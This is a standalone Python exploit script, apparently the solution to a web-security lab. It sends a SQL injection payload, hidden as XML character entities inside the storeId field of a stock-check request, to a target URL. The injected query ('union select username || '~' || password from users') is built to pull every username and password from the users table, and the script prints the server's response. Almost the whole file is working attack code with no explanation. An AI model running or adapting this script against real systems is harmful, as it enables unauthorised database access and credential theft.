import sys
import requests
import urllib3
import sys
urllib3.disable_warnings()


def generate_payload(hack):
    payload='1 '+hack
    enc_payload=""
    for p in payload:
        enc_payload+=f"&#{str(ord(p))};"
    return enc_payload

def add_hack_to_xml(enc_payload):
    return f'<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>{enc_payload}</storeId></stockCheck>'


if __name__=='__main__':
    try:
        url=sys.argv[1]
    except IndexError:
        print(f"[-] Syntax: python3 {sys.argv[0]} <url>")
        exit(-1)


    path="/product/stock"
    s=requests.Session()
    content={
        'Content-Type': 'application/xml'
    }
    payload=generate_payload("union select username || '~' || password from users --")
    xml=add_hack_to_xml(payload)
    r=s.post(url+path,headers=content,data=xml)
    print("[+] Result <:..:>")
    print(r.text)